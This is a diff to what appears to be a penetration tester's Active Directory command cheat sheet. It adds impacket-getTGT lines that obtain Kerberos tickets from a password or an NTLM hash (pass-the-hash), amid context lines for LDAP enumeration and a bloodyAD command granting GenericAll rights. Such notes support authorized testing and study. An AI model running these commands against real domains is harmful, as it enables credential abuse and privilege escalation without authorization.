@@ -862,6 +862,11 @@ snmp-check $TARGET -c COMMUNITY_STRING -v 2c
 (DC Hostname)
 nmap -n -Pn $TARGET --script "ldap* and not brute" -p 389 | grep 'dnsHostName:' | cut -d ' ' -f9
 
+Generate .ccache
+(Ticket Granting Ticket)
+impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'; kcme
+impacket-getTGT $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; kcme
+
 (Domain SID)
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
 
@@ -869,6 +874,7 @@ nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee usernames_$DC
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag && $1 ~ /^[A-Za-z]/ {print $1}' | awk NF | tr '[:upper:]' '[:lower:]' | tee computers_$DC
 
+[###] Machine Account Quota
 [###] Add GenericAll
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
 
